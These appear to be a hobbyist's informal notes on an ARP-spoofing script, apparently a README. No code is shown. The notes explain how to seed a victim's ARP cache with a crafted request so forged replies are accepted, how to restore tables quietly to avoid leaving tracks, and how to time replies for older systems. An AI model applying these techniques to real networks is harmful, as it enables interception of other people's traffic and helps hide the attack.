------------------

so some key points here

multithread processess must be termiante, closed and joined to the father thread they belong. on my case the main thread was the 
initial program. now dont forget to use while true before the keyboard interrupt becaseu if not the threat will be incorreclty 
closed and will output error, you must to properly close this

i used threads becase i needed to sniff the network at the same time i triggered the first request arp to the victim
and here is another revelation, tools liek arpspoof from dsniff wont work if the ip we trying to impersonate is not, i repeat, is not
previously saved on the arp table of the victim. is a , as this day, coutermeasuere to not accept replies from ips that where not
asked, and is common sense. 
and i know im doign more work as i needed to do , btu i wnated to paly a little and discover that if we send a planned request arp
like seting up the base, a trigger, after that any reply built on that request will be accepted
i know the router will always be saved so no sense, but what if we we would wnat to do this with another host o nthe network

key thing here is that we , when revertign the attack, we ask for the repli arp , after an arp request, and save the mac address, after that
we have the mac address of the victim and the host or dev we impersonating. we send multipel replies to those to not leave tracks.

i know my code could have some errors, but proud to be with this script. i must say that if you want to use this code, pelase do it on a 
controled environment since it tends sometimes to fail , so you must to be careful

also another thign i learned was that some older OSes wont cahnge the arp table on replies if they go too fast, hence the time (variable inter) for the replies each 1 sec and different for mthe last sendp which is 0.5 secs
